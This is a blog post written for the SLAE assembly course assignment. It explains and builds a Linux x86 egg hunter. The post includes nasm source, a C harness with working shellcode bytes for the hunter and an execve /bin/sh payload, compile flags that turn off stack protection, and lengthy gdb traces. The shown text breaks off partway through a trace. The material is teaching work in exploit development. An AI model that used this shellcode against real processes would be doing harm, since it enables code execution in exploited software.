---
layout: post
title: SLAE Assignment 3 - Egg Hunter
date: '2016-12-04T17:10:00.000-06:00'
author: Sanjiv Kawa
tags:
- SLAE
- SecurityTube
- Assignment
- Shellcode
- nasm
- assembly
- egg hunter
- access syscall
comments: true
---

### SLAE Assignment Stub
This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification.

<a href="http://www.securitytube-training.com/online-courses/securitytube-linux-assembly-expert/">http://www.securitytube-training.com/online-courses/securitytube-linux-assembly-expert/</a>

Student ID: SLAE-807


### Assignment 3 Requirements
- Study the egg hunter shellcode. It is similar to a two stage shellcode.
- The first stage searches for a pattern it can find in memory. That pattern signifies where the second stage lies which needs to be executed.
- Create a working demo of an egg hunter. It should be configurable for different payloads. This means that once the pattern has been found the second stage should be easily configurable.


### What are Egg Hunters?
First off, I want to thank Skape for putting together a paper titled <a href="www.hick.org/code/skape/papers/egghunt-shellcode.pdf">Safely Searching Process Virtual Address Space</a>. This really helped me understand how to write Linux x86 egg hunters that are robust, reliable and can safely traverse the virtual memory address space of an arbitrary process.

Egg hunters are incredibly useful from an exploitation perspective. There are scenarios where a small amount of space is accessible in a deterministic location of an arbitrary process. This space is usually too small for shellcode, but can house an egg hunter.

Shellcode is then placed somewhere else in the same arbitrary process, however the specific location is unknown.

The purpose of an egg hunter, in terms of exploitation, can be broken in to two stages:

- Stage 1 consists of traversing the virtual memory address space for a process and inspecting all memory locations for a specific, yet arbitrarily constructed four byte value. This value is referred to as an egg, for example: `\x41\x42\x41\x42`. There are some cases where an egg needs to avoid certain bad characters or contain valid instructions, this is based on the design of the egg hunter, and sometimes restrictions imposed by the process.

- Stage 2 consists of passing execution to the memory location in the same arbitrary process that contains the shellcode. The same egg is placed at the beginning of shellcode, typically twice, and signifies the start of a series of malicious instructions. For example: `\x41\x42\x41\x42\x41\x42\x41\x42[execute shell on remote system]`.

The reason why the egg is placed twice at the beginning of the shellcode is because it enables the egg hunter to search for a value in memory that has the same four byte values which are one after the other.


### The Shellcode
The example shellcode I will be using is a really simple stack-based `execve` SYSCALL that executes `/bin/sh`.

The nasm source is located <a href="https://github.com/skahwah/slae/blob/master/execve-stack/execve-stack.nasm">here</a> and a brief breakdown of the shellcode is located <a href="https://popped.io/execve-stack/">here<a>.


Here are the opcodes:

~~~ bash
\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80
~~~

### The Egghunter
The egg hunter is responsible for searching for the shellcode in the virtual memory address space of an arbitrary process.

The egg hunter uses the `access` system call to identify valid memory addresses by means of the `EFAULT` error code. If this error code is returned by the `access` system call, the page value is simply incremented to the next page until a valid memory address is found.

Once a valid memory address is found, the `scas` instruction is used to compare the `DWORD` value in the current memory location against the egg. If the contents of the current memory location do not contain the egg, then the address is incremented and the search continues until the egg is found. At this point, execution of the process is directed to the memory address directly after the located eggs, which signifies the start of the `execve` `/bin/sh` shellcode.

The egg hunter can be found <a href="https://github.com/skahwah/slae/blob/master/assignment3/egghunter.nasm">here</a>.

I have also created a "test" program written in C. This uses the egg hunter to traverse the virtual memory address space for the "test" process searching for a user supplied egg. The egg does not need to consist of executable instructions.

This egg is prepended to the stack-based `execve` `/bin/sh` shellcode. Once the egg is found, execution is passed to the shellcode.

The test program can be found <a href="https://github.com/skahwah/slae/blob/master/assignment3/egghunter-test.c">here</a>.

Compile it using these options: `gcc -fno-stack-protector -z execstack egghunter-test.c -o egghunter-test`


### Dissecting the Egg Hunter
1\. Clearing the direction flag and registers

The first few instructions are responsible for clearing the `EAX` and `EBX` registers. The direction flag is also cleared to prevent the egg hunter from failing as the `scas` instruction is used. It may be possible that this flag is set by the process, although unlikely.

~~~ nasm
cld		
xor eax, eax`
xor edx, edx
~~~

<br>2\. `next_page:`

The `next_page:` procedure is responsible for aligning the page value of the current memory address. It largely serves as an incrementor to the next page size if an invalid memory location is returned by the `access` system call.

The first address of relevance is typically `0x8048000`, however this egg hunter does not assume that the virtual memory address space for the given process follows conventional memory address spaces. As such, the first address that is examined is `0x0001000`.

~~~ nasm
next_page:
  or dx, 0xfff ;page alignment
~~~

<br>2\. `increment_address:`

The `increment_address:` procedure is largely responsible for incrementing the current address that is in `EDX` by `1`. Later, the value in the `EDX` is placed into `EDI` when inspected by `scas`> The purpose of this is to increment the current address in the event that the user supplied egg as not been found.

~~~ nasm
inc edx		
~~~

<br>3\. The `access` system call

The `access` system call, `0x21` or `33`, simply takes the value currently in the `EBX` register, which represents a memory location, and attempts to access it. The return value of the `access` syscall is stored in `AL` and indicates if the supplied memory location is valid. The `access` system call only requires the one argument.

The `EBX` register contains the value in the `EDX` register plus four. This is so that eight contiguous bytes of memory can be searched.

~~~ nasm
lea ebx, [edx +0x4]
mov eax, 0x21		
int 0x80
~~~

<br>4\. `search_vas:`

The `search_vas:` procedure is largely responsible for comparing the `DWORD` value in the current memory location against the egg and directing execution of the process to shellcode once the egg has been located. However, this can be elaborated on and other interesting elements in this procedure can also be touched on.

First, a comparison is conducted against the value currently in the `AL` register and `0xf2`.

~~~ nasm
cmp al, 0xf2
~~~

The return value of the `access` system call is stored in `AL` and indicates if the supplied memory location is valid. If the memory location is not valid, `0xf2`, which represents the low byte of the `EFAULT` return value is stored in the `AL` register.

If `0xf2` exists in `AL` the current memory location is invalid. The zero flag is set, as comparing `0xf2` by itself is `0`. This triggers the next instruction to execute.

 ~~~ nasm
 je next_page
 ~~~

This jumps to the `next_page` procedure. As mentioned in Step. 2, the `next_page` procedure increments to the next page value.

If `AL` does not contain `0xf2`, then a valid memory address has been accessed by the `access` system call and the previous instruction in skipped as the zero flag will not be set.

The following instruction simply moves the egg in to the `EAX` register.

~~~ nasm
mov eax, 0x534B534B ;SKSK
~~~ 	

The reason for this is that the `EAX` register is one of the native IA-32 instructions for doing string based comparisons with `scas`. In other words, the value in the memory location currently inspected by `scas` is compared against the value in `EAX`.

The next instruction takes the value in `EDX`, which is a memory address, and places it into `EDI` as `EDI` is used by `scas` when inspecting the contents of a memory location.

In addition, the current memory address in `EDX`, and now `EDI` is currently four bytes behind the value in `EBX`, which was the memory address accessed by the `access` system call.

~~~ nasm
mov edi, edx
~~~


The next instruction takes the `DWORD` stored in `EAX`, which is the egg, `0x534B534B`, and compares it against the value in the memory location referred to be the `EDI` register.

~~~ nasm
scasd
~~~

If the value in the memory location pointed to the `EDI` register does not match the value in the `EAX` register, essentially meaning that the egg has not been found, then the zero flag will not be set. This triggers the next instruction to execute.

~~~ nasm
jne increment_address
~~~

This jumps to the `increment_address` procedure. As mentioned in Step. 1, the `increment_address` procedure increments the value in `EDX`, which is later stored in `EDI` to the next memory address to be searched by `scasd`.

Otherwise, if the zero flag is set, this indicates that the egg has been located in the memory location currently pointed to by `EDI`. As comparing the egg in `EAX` with the value in `EDI`, which is also the egg results in a `0`.

`scasd` then increments the value in `EDI` by four bytes. This effectively shifts the comparison done by `scasd` to the next memory address after the egg. This is the memory location for the duplicated egg before the beginning of the shellcode.

`scasd` will once again set the zero flag which indicates that the egg has been located in the memory location currently pointed to by `EDI`. As comparing the egg in `EAX` with the value in `EDI`, which is the second egg results in a `0`.

`scasd` then increments the value in `EDI` by four bytes. The address in `EDI` now contains the memory location pointing to the beginning of the shellcode after the eight egg bytes.

The zero flag is set, once again, thus bypassing the next instruction which is `jne increment_address` and executing the following instruction `jmp edi`.

`EDI` currently contains the memory address to where the second stage exists, this is the address contains the beginning of the shellcode after the eight egg bytes.

As such, once `jmp edi` is executed, the process performs an unconditional jump to the memory address where the second stage exists and passes control to the shellcode.

~~~ nasm
cmp al, 0xf2			
je next_page			
mov eax, 0x534B534B
mov edi, edx
scasd
jne increment_address		
scasd				
jne increment_address		
jmp edi
~~~


### The Test Program
As mentioned above, I have created a "test" program written in C. This uses the egg hunter to traverse the virtual memory address space for the "test" process for a user supplied egg.

~~~ c
/*
Egg Hunter for Linux x86
Sanjiv Kawa (@skawasec)
www.popped.io
December 4, 2016
*/

#include<stdio.h>
#include<string.h>

#define EGG "\x4b\x53\x4b\x53" //SKSK

char egg[] = EGG;

unsigned char egg_hunter[] = \
                              "\xfc"	   	           	// cld
                              "\x31\xc0"	           	// xor eax,eax
                              "\x31\xd2"          		// xor ebx,ebx
                              "\x66\x81\xca\xff\x0f"	// or dx,0xfff
                              "\x42"		            	// inc edx
                              "\x8d\x5a\x04"       		// lea ebx,[edx+0x4]
                              "\xb8\x21\x00\x00\x00"	// mov eax,0x21
                              "\xcd\x80"		          // int 0x80
                              "\x3c\xf2"		          // cmp al,0xf2
                              "\x74\xec"		          // je next_page
                              "\xb8" EGG		          // mov EGG
                              "\x89\xd7"		          // mov edi,edx
                              "\xaf"			            // scasd
                              "\x75\xe7"		          // jne increment_address
                              "\xaf"			            // scasd
                              "\x75\xe4"		          // jne increment_address
                              "\xff\xe7";		          // jmp edi


unsigned char second_stage[] = \
                                EGG
                                EGG
                                "\x31\xc0\x50\x68\x6e\x2f\x73\x68"
                                "\x68\x2f\x2f\x62\x69\x89\xe3\x50"
                                "\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"; // /bin/sh execve-stack

main()
{
  printf("[+] Searching for: %s\n", EGG);
  printf("[+] Egg Hunter Length: %d\n", strlen(egg_hunter));
  printf("[+] Shellcode Length: %d\n", strlen(second_stage));
  int (*ret)() = (int(*)())egg_hunter;
  ret();
}
~~~

The test program can be found <a href="https://github.com/skahwah/slae/blob/master/assignment3/egghunter-test.c">here</a>.

Execution of the egg hunter can be examined in `gdb` after linking, assembling and extracting the opcodes from the egg hunter and placing them into the test program is done.

Before this examining the egg hunter in `gdb`, it is a good idea to test if the program executes as expected.

~~~ bash
skawa@ubuntu:~/Desktop/code/assignment/assignment3$ ls
compile.sh  egghunter.nasm  shellcode.c
skawa@ubuntu:~/Desktop/code/assignment/assignment3$ ./compile.sh egghunter
[+] Assembling with Nasm
[+] Linking
[+] Extracting Opcodes
"\xfc\x31\xc0\x31\xd2\x66\x81\xca\xff\x0f\x42\x8d\x5a\x04\xb8\x21\x00\x00\x00\xcd\x80\x3c\xf2\x74\xec\xb8\x4b\x53\x4b\x53\x89\xd7\xaf\x75\xe7\xaf\x75\xe4\xff\xe7"
skawa@ubuntu:~/Desktop/code/assignment/assignment3$ vim shellcode.c
skawa@ubuntu:~/Desktop/code/assignment/assignment3$ cat shellcode.c | grep "hunter\[\]" -A 18
unsigned char egg_hunter[] = \
                              "\xfc"	   	           	// cld
                              "\x31\xc0"	           	// xor eax,eax
                              "\x31\xd2"          		// xor ebx,ebx
                              "\x66\x81\xca\xff\x0f"	// or dx,0xfff
                              "\x42"		            	// inc edx
                              "\x8d\x5a\x04"       		// lea ebx,[edx+0x4]
                              "\xb8\x21\x00\x00\x00"	// mov eax,0x21
                              "\xcd\x80"		          // int 0x80
                              "\x3c\xf2"		          // cmp al,0xf2
                              "\x74\xec"		          // je next_page
                              "\xb8" EGG		          // mov EGG
                              "\x89\xd7"		          // mov edi,edx
                              "\xaf"			            // scasd
                              "\x75\xe7"		          // jne increment_address
                              "\xaf"			            // scasd
                              "\x75\xe4"		          // jne increment_address
                              "\xff\xe7";		          // jmp edi

skawa@ubuntu:~/Desktop/code/assignment/assignment3$ gcc -fno-stack-protector -z execstack shellcode.c -o shellcode
skawa@ubuntu:~/Desktop/code/assignment/assignment3$ ./shellcode
[+] Searching for: KSKS
[+] Egg Hunter Length: 16
[+] Shellcode Length: 33
$ exit
skawa@ubuntu:~/Desktop/code/assignment/assignment3$
~~~

### Stepping through the execution
A hook-stop has been defined to keep an eye on the state of the different general purpose registers, eflags as well as the contents of the `EDI` register

~~~ nasm
skawa@ubuntu:~/Desktop/code/assignment/assignment3$ gdb -q ./shellcode
Reading symbols from /home/skawa/Desktop/code/assignment/assignment3/shellcode...(no debugging symbols found)...done.
(gdb) break *&egg_hunter
Breakpoint 1 at 0x804a060
(gdb) run
Starting program: /home/skawa/Desktop/code/assignment/assignment3/shellcode
[+] Searching for: KSKS
[+] Egg Hunter Length: 16
[+] Shellcode Length: 33

Breakpoint 1, 0x0804a060 in egg_hunter ()
(gdb) define hook-stop
Type commands for definition of "hook-stop".
End with a line saying just "end".
>print/x $eax
>print/x $ebx
>print/x $edx
>print/x $edi
>x/4bx $edi
>i r eflags
>disas
>end
(gdb) stepi
$1 = 0x804a060
$2 = 0xb7fc6ff4
$3 = 0x0
$4 = 0x804a0c2
0x804a0c2:	0x00	0x00	0x00	0x00
eflags         0x282	[ SF IF ]
Dump of assembler code for function egg_hunter:
   0x0804a060 <+0>:	cld    
=> 0x0804a061 <+1>:	xor    eax,eax
   0x0804a063 <+3>:	xor    edx,edx
   0x0804a065 <+5>:	or     dx,0xfff
   0x0804a06a <+10>:	inc    edx
   0x0804a06b <+11>:	lea    ebx,[edx+0x4]
   0x0804a06e <+14>:	mov    eax,0x21
   0x0804a073 <+19>:	int    0x80
   0x0804a075 <+21>:	cmp    al,0xf2
   0x0804a077 <+23>:	je     0x804a065 <egg_hunter+5>
   0x0804a079 <+25>:	mov    eax,0x534b534b
   0x0804a07e <+30>:	mov    edi,edx
   0x0804a080 <+32>:	scas   eax,DWORD PTR es:[edi]
   0x0804a081 <+33>:	jne    0x804a06a <egg_hunter+10>
   0x0804a083 <+35>:	scas   eax,DWORD PTR es:[edi]
   0x0804a084 <+36>:	jne    0x804a06a <egg_hunter+10>
   0x0804a086 <+38>:	jmp    edi
   0x0804a088 <+40>:	add    BYTE PTR [eax],al
End of assembler dump.
0x0804a061 in egg_hunter ()
(gdb)
~~~

As mentioned, the first virtual address space of relevance is typically `0x8048000`, however this egg hunter does not assume that the virtual memory address space for the given process follows conventional means. As such, the first address that is examined is `0x0001000`.

The following disassembly just displays how the page alignment occurs. Until a valid address is located, such as `0x8048000`, the comparison of `AL` and the lower byte of the `EFAULT` flag will always result in the zero flag being set, directing the execution of the process back to the page alignment instruction `dx,0xfff` and incrementing `EBX` and `EBX` by page sizes.

~~~ nasm
(gdb) break *0x0804a075
Breakpoint 2 at 0x804a075
(gdb) c
Continuing.
$5 = 0xfffffff2
$6 = 0x1004
$7 = 0x1000
$8 = 0x804a0c2
0x804a0c2:	0x00	0x00	0x00	0x00
eflags         0x216	[ PF AF IF ]
Dump of assembler code for function egg_hunter:
   0x0804a060 <+0>:	cld    
   0x0804a061 <+1>:	xor    eax,eax
   0x0804a063 <+3>:	xor    edx,edx
   0x0804a065 <+5>:	or     dx,0xfff
   0x0804a06a <+10>:	inc    edx
   0x0804a06b <+11>:	lea    ebx,[edx+0x4]
   0x0804a06e <+14>:	mov    eax,0x21
   0x0804a073 <+19>:	int    0x80
=> 0x0804a075 <+21>:	cmp    al,0xf2
   0x0804a077 <+23>:	je     0x804a065 <egg_hunter+5>
   0x0804a079 <+25>:	mov    eax,0x534b534b
   0x0804a07e <+30>:	mov    edi,edx
   0x0804a080 <+32>:	scas   eax,DWORD PTR es:[edi]
   0x0804a081 <+33>:	jne    0x804a06a <egg_hunter+10>
   0x0804a083 <+35>:	scas   eax,DWORD PTR es:[edi]
   0x0804a084 <+36>:	jne    0x804a06a <egg_hunter+10>
   0x0804a086 <+38>:	jmp    edi
   0x0804a088 <+40>:	add    BYTE PTR [eax],al
End of assembler dump.

Breakpoint 2, 0x0804a075 in egg_hunter ()
(gdb)
Continuing.
$9 = 0xfffffff2
$10 = 0x2004
$11 = 0x2000
$12 = 0x804a0c2
0x804a0c2:	0x00	0x00	0x00	0x00
eflags         0x216	[ PF AF IF ]
Dump of assembler code for function egg_hunter:
   0x0804a060 <+0>:	cld    
   0x0804a061 <+1>:	xor    eax,eax
   0x0804a063 <+3>:	xor    edx,edx
   0x0804a065 <+5>:	or     dx,0xfff
   0x0804a06a <+10>:	inc    edx
   0x0804a06b <+11>:	lea    ebx,[edx+0x4]
   0x0804a06e <+14>:	mov    eax,0x21
   0x0804a073 <+19>:	int    0x80
=> 0x0804a075 <+21>:	cmp    al,0xf2
   0x0804a077 <+23>:	je     0x804a065 <egg_hunter+5>
   0x0804a079 <+25>:	mov    eax,0x534b534b
   0x0804a07e <+30>:	mov    edi,edx
   0x0804a080 <+32>:	scas   eax,DWORD PTR es:[edi]
   0x0804a081 <+33>:	jne    0x804a06a <egg_hunter+10>
   0x0804a083 <+35>:	scas   eax,DWORD PTR es:[edi]
   0x0804a084 <+36>:	jne    0x804a06a <egg_hunter+10>
   0x0804a086 <+38>:	jmp    edi
   0x0804a088 <+40>:	add    BYTE PTR [eax],al
End of assembler dump.

Breakpoint 2, 0x0804a075 in egg_hunter ()
(gdb)
Continuing.
$13 = 0xfffffff2
$14 = 0x3004
$15 = 0x3000
$16 = 0x804a0c2
0x804a0c2:	0x00	0x00	0x00	0x00
eflags         0x216	[ PF AF IF ]
Dump of assembler code for function egg_hunter:
   0x0804a060 <+0>:	cld    
   0x0804a061 <+1>:	xor    eax,eax
   0x0804a063 <+3>:	xor    edx,edx
   0x0804a065 <+5>:	or     dx,0xfff
   0x0804a06a <+10>:	inc    edx
   0x0804a06b <+11>:	lea    ebx,[edx+0x4]
   0x0804a06e <+14>:	mov    eax,0x21
   0x0804a073 <+19>:	int    0x80
=> 0x0804a075 <+21>:	cmp    al,0xf2
   0x0804a077 <+23>:	je     0x804a065 <egg_hunter+5>
   0x0804a079 <+25>:	mov    eax,0x534b534b
   0x0804a07e <+30>:	mov    edi,edx
   0x0804a080 <+32>:	scas   eax,DWORD PTR es:[edi]
   0x0804a081 <+33>:	jne    0x804a06a <egg_hunter+10>
   0x0804a083 <+35>:	scas   eax,DWORD PTR es:[edi]
   0x0804a084 <+36>:	jne    0x804a06a <egg_hunter+10>
   0x0804a086 <+38>:	jmp    edi
   0x0804a088 <+40>:	add    BYTE PTR [eax],al
End of assembler dump.

Breakpoint 2, 0x0804a075 in egg_hunter ()
(gdb)
~~~

The following disassembly displays the first valid address that has been located by the `access` system call this is `0x8048004`.

~~~ nasm
(gdb) del 2
(gdb) break *0x0804a079
Breakpoint 3 at 0x804a079
(gdb) c
Continuing.
$65 = 0xfffffffe
$66 = 0x8048004
$67 = 0x8048000
$68 = 0x804a0c2
0x804a0c2:	0x00	0x00	0x00	0x00
eflags         0x206	[ PF IF ]
Dump of assembler code for function egg_hunter:
   0x0804a060 <+0>:	cld    
   0x0804a061 <+1>:	xor    eax,eax
   0x0804a063 <+3>:	xor    edx,edx
   0x0804a065 <+5>:	or     dx,0xfff
   0x0804a06a <+10>:	inc    edx
   0x0804a06b <+11>:	lea    ebx,[edx+0x4]
   0x0804a06e <+14>:	mov    eax,0x21
   0x0804a073 <+19>:	int    0x80
   0x0804a075 <+21>:	cmp    al,0xf2
   0x0804a077 <+23>:	je     0x804a065 <egg_hunter+5>
=> 0x0804a079 <+25>:	mov    eax,0x534b534b
   0x0804a07e <+30>:	mov    edi,edx
   0x0804a080 <+32>:	scas   eax,DWORD PTR es:[edi]
   0x0804a081 <+33>:	jne    0x804a06a <egg_hunter+10>
   0x0804a083 <+35>:	scas   eax,DWORD PTR es:[edi]
   0x0804a084 <+36>:	jne    0x804a06a <egg_hunter+10>
   0x0804a086 <+38>:	jmp    edi
   0x0804a088 <+40>:	add    BYTE PTR [eax],al
End of assembler dump.

Breakpoint 3, 0x0804a079 in egg_hunter ()
(gdb)
~~~

The `EDX` register currently hold the value `0x8048000`, which is a particular memory segment. This value is placed into `EDI` and a `scas` performs a string comparison between the `DWORD` value in `EAX`, which is the egg, `0x534b534b`, and the value in the memory address in `EDI`, which is `0x7f	0x45	0x4c	0x46`.

~~~ nasm
(gdb)
$73 = 0x534b534b
$74 = 0x8048004
$75 = 0x8048000
$76 = 0x8048000
0x8048000:	0x7f	0x45	0x4c	0x46
eflags         0x206	[ PF IF ]
Dump of assembler code for function egg_hunter:
   0x0804a060 <+0>:	cld    
   0x0804a061 <+1>:	xor    eax,eax
   0x0804a063 <+3>:	xor    edx,edx
   0x0804a065 <+5>:	or     dx,0xfff
   0x0804a06a <+10>:	inc    edx
   0x0804a06b <+11>:	lea    ebx,[edx+0x4]
   0x0804a06e <+14>:	mov    eax,0x21
   0x0804a073 <+19>:	int    0x80
   0x0804a075 <+21>:	cmp    al,0xf2
   0x0804a077 <+23>:	je     0x804a065 <egg_hunter+5>
   0x0804a079 <+25>:	mov    eax,0x534b534b
   0x0804a07e <+30>:	mov    edi,edx
=> 0x0804a080 <+32>:	scas   eax,DWORD PTR es:[edi]
   0x0804a081 <+33>:	jne    0x804a06a <egg_hunter+10>
   0x0804a083 <+35>:	scas   eax,DWORD PTR es:[edi]
   0x0804a084 <+36>:	jne    0x804a06a <egg_hunter+10>
   0x0804a086 <+38>:	jmp    edi
   0x0804a088 <+40>:	add    BYTE PTR [eax],al
End of assembler dump.
0x0804a080 in egg_hunter ()
(gdb)
~~~

As the value in the memory location, `0x8048000`, pointed to by the `EDI` register does not match the value of the egg in the `EAX` register, the zero flag will not be set. This directs the execution of the process back to the `inc edx` instruction which increments the value in the `EDX` by `1`.

The next memory location that is placed into `EDI` is `0x8048001` as the value in `EDX` is assigned into `EDI`.

This process continues until the string comparison conducted by `scas` results in a match, thus setting the zero flag.

~~~ nasm
(gdb)
$113 = 0x534b534b
$114 = 0x8048005
$115 = 0x8048001
$116 = 0x8048001
0x8048001:	0x45	0x4c	0x46	0x01
eflags         0x206	[ PF IF ]
Dump of assembler code for function egg_hunter:
   0x0804a060 <+0>:	cld    
   0x0804a061 <+1>:	xor    eax,eax
   0x0804a063 <+3>:	xor    edx,edx
   0x0804a065 <+5>:	or     dx,0xfff
   0x0804a06a <+10>:	inc    edx
   0x0804a06b <+11>:	lea    ebx,[edx+0x4]
   0x0804a06e <+14>:	mov    eax,0x21
   0x0804a073 <+19>:	int    0x80
   0x0804a075 <+21>:	cmp    al,0xf2
   0x0804a077 <+23>:	je     0x804a065 <egg_hunter+5>
   0x0804a079 <+25>:	mov    eax,0x534b534b
   0x0804a07e <+30>:	mov    edi,edx
=> 0x0804a080 <+32>:	scas   eax,DWORD PTR es:[edi]
   0x0804a081 <+33>:	jne    0x804a06a <egg_hunter+10>
   0x0804a083 <+35>:	scas   eax,DWORD PTR es:[edi]
   0x0804a084 <+36>:	jne    0x804a06a <egg_hunter+10>
   0x0804a086 <+38>:	jmp    edi
   0x0804a088 <+40>:	add    BYTE PTR [eax],al
End of assembler dump.
0x0804a080 in egg_hunter ()
(gdb)
~~~


Eventually, the value `0x804a0a0` is loaded from `EDX` into `EDI`.

~~~ nasm
(gdb)
$4037 = 0x534b534b
$4038 = 0x804a0a4
$4039 = 0x804a0a0
$4040 = 0x804a0a3
0x804a0a3 <second_stage+3>:	0x53	0x4b	0x53	0x4b
eflags         0x206	[ PF IF ]
Dump of assembler code for function egg_hunter:
   0x0804a060 <+0>:	cld    
   0x0804a061 <+1>:	xor    eax,eax
   0x0804a063 <+3>:	xor    edx,edx
   0x0804a065 <+5>:	or     dx,0xfff
   0x0804a06a <+10>:	inc    edx
   0x0804a06b <+11>:	lea    ebx,[edx+0x4]
   0x0804a06e <+14>:	mov    eax,0x21
   0x0804a073 <+19>:	int    0x80
   0x0804a075 <+21>:	cmp    al,0xf2
   0x0804a077 <+23>:	je     0x804a065 <egg_hunter+5>
   0x0804a079 <+25>:	mov    eax,0x534b534b
=> 0x0804a07e <+30>:	mov    edi,edx
   0x0804a080 <+32>:	scas   eax,DWORD PTR es:[edi]
   0x0804a081 <+33>:	jne    0x804a06a <egg_hunter+10>
   0x0804a083 <+35>:	scas   eax,DWORD PTR es:[edi]
   0x0804a084 <+36>:	jne    0x804a06a <egg_hunter+10>
   0x0804a086 <+38>:	jmp    edi
   0x0804a088 <+40>:	add    BYTE PTR [eax],al
End of assembler dump.
0x0804a07e in egg_hunter ()
~~~

A `DWORD` string comparison is conducted between the value in the `EAX` register, which is the egg, `0x534b534b`, and the value in the memory address currently pointed to by `EDI`, which is `0x4b	0x53	0x4b	0x53`. As this is a match, the zero flag is set and process will ignore the conditional jump instruction and move on to the following `scas` instruction.

It is important to note, that after the string comparison occurred, the `scas` instruction adds four bytes to the memory location pointed to by `EDI`. As such, `EDI` has been updated from `0x804a0a0` to `0x804a0a4`.

~~~ nasm
(gdb)
$4041 = 0x534b534b
$4042 = 0x804a0a4
$4043 = 0x804a0a0
$4044 = 0x804a0a0
0x804a0a0 <second_stage>:	0x4b	0x53	0x4b	0x53
eflags         0x206	[ PF IF ]
Dump of assembler code for function egg_hunter:
   0x0804a060 <+0>:	cld    
   0x0804a061 <+1>:	xor    eax,eax
   0x0804a063 <+3>:	xor    edx,edx
   0x0804a065 <+5>:	or     dx,0xfff
   0x0804a06a <+10>:	inc    edx
   0x0804a06b <+11>:	lea    ebx,[edx+0x4]
   0x0804a06e <+14>:	mov    eax,0x21
   0x0804a073 <+19>:	int    0x80
   0x0804a075 <+21>:	cmp    al,0xf2
   0x0804a077 <+23>:	je     0x804a065 <egg_hunter+5>
   0x0804a079 <+25>:	mov    eax,0x534b534b
   0x0804a07e <+30>:	mov    edi,edx
=> 0x0804a080 <+32>:	scas   eax,DWORD PTR es:[edi]
   0x0804a081 <+33>:	jne    0x804a06a <egg_hunter+10>
   0x0804a083 <+35>:	scas   eax,DWORD PTR es:[edi]
   0x0804a084 <+36>:	jne    0x804a06a <egg_hunter+10>
   0x0804a086 <+38>:	jmp    edi
   0x0804a088 <+40>:	add    BYTE PTR [eax],al
End of assembler dump.
0x0804a080 in egg_hunter ()
(gdb)
$4045 = 0x534b534b
$4046 = 0x804a0a4
$4047 = 0x804a0a0
$4048 = 0x804a0a4
0x804a0a4 <second_stage+4>:	0x4b	0x53	0x4b	0x53
eflags         0x246	[ PF ZF IF ]
Dump of assembler code for function egg_hunter:
   0x0804a060 <+0>:	cld    
   0x0804a061 <+1>:	xor    eax,eax
   0x0804a063 <+3>:	xor    edx,edx
   0x0804a065 <+5>:	or     dx,0xfff
   0x0804a06a <+10>:	inc    edx
   0x0804a06b <+11>:	lea    ebx,[edx+0x4]
   0x0804a06e <+14>:	mov    eax,0x21
   0x0804a073 <+19>:	int    0x80
   0x0804a075 <+21>:	cmp    al,0xf2
   0x0804a077 <+23>:	je     0x804a065 <egg_hunter+5>
   0x0804a079 <+25>:	mov    eax,0x534b534b
   0x0804a07e <+30>:	mov    edi,edx
   0x0804a080 <+32>:	scas   eax,DWORD PTR es:[edi]
=> 0x0804a081 <+33>:	jne    0x804a06a <egg_hunter+10>
   0x0804a083 <+35>:	scas   eax,DWORD PTR es:[edi]
   0x0804a084 <+36>:	jne    0x804a06a <egg_hunter+10>
   0x0804a086 <+38>:	jmp    edi
   0x0804a088 <+40>:	add    BYTE PTR [eax],al
End of assembler dump.
0x0804a081 in egg_hunter ()
(gdb)
~~~


Taking a look at the source code, is is clear that the memory address `0x804a0a0` pointed to the first `EGG` at the beginning of the shellcode.

After the `scas` instruction added four bytes to `0x804a0a0`, `EDI` has now been incremented to `0x804a0a4` and currently points to the second `EGG` before the start of the shellcode.

~~~ c
unsigned char second_stage[] = \
                                EGG
                                EGG
                                "\x31\xc0\x50\x68\x6e\x2f\x73\x68"
                                "\x68\x2f\x2f\x62\x69\x89\xe3\x50"
                                "\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"; // /bin/sh execve-stack
~~~


The same `DWORD` string comparison is conducted between the value in the `EAX` register, which is the egg, `0x534b534b`, and the value in the memory address currently pointed to by `EDI`, which is `0x4b	0x53	0x4b	0x53`. As this is a match, the zero flag is set and process will ignore the conditional jump instruction and move on to the following `jmp edi` instruction.

After the string comparison occurred, the `scas` instruction adds four bytes to the memory location pointed to by `EDI`. As such, `EDI` has been updated from `0x804a0a4` to `0x804a0a8` and now points to the beginning of the shellcode after the two egg identifiers.

~~~ nasm
$4049 = 0x534b534b
$4050 = 0x804a0a4
$4051 = 0x804a0a0
$4052 = 0x804a0a4
0x804a0a4 <second_stage+4>:	0x4b	0x53	0x4b	0x53
eflags         0x246	[ PF ZF IF ]
Dump of assembler code for function egg_hunter:
   0x0804a060 <+0>:	cld    
   0x0804a061 <+1>:	xor    eax,eax
   0x0804a063 <+3>:	xor    edx,edx
   0x0804a065 <+5>:	or     dx,0xfff
   0x0804a06a <+10>:	inc    edx
   0x0804a06b <+11>:	lea    ebx,[edx+0x4]
   0x0804a06e <+14>:	mov    eax,0x21
   0x0804a073 <+19>:	int    0x80
   0x0804a075 <+21>:	cmp    al,0xf2
   0x0804a077 <+23>:	je     0x804a065 <egg_hunter+5>
   0x0804a079 <+25>:	mov    eax,0x534b534b
   0x0804a07e <+30>:	mov    edi,edx
   0x0804a080 <+32>:	scas   eax,DWORD PTR es:[edi]
   0x0804a081 <+33>:	jne    0x804a06a <egg_hunter+10>
=> 0x0804a083 <+35>:	scas   eax,DWORD PTR es:[edi]
   0x0804a084 <+36>:	jne    0x804a06a <egg_hunter+10>
   0x0804a086 <+38>:	jmp    edi
   0x0804a088 <+40>:	add    BYTE PTR [eax],al
End of assembler dump.
0x0804a083 in egg_hunter ()
(gdb)
$4053 = 0x534b534b
$4054 = 0x804a0a4
$4055 = 0x804a0a0
$4056 = 0x804a0a8
0x804a0a8 <second_stage+8>:	0x31	0xc0	0x50	0x68
eflags         0x246	[ PF ZF IF ]
Dump of assembler code for function egg_hunter:
   0x0804a060 <+0>:	cld    
   0x0804a061 <+1>:	xor    eax,eax
   0x0804a063 <+3>:	xor    edx,edx
   0x0804a065 <+5>:	or     dx,0xfff
   0x0804a06a <+10>:	inc    edx
   0x0804a06b <+11>:	lea    ebx,[edx+0x4]
   0x0804a06e <+14>:	mov    eax,0x21
   0x0804a073 <+19>:	int    0x80
   0x0804a075 <+21>:	cmp    al,0xf2
   0x0804a077 <+23>:	je     0x804a065 <egg_hunter+5>
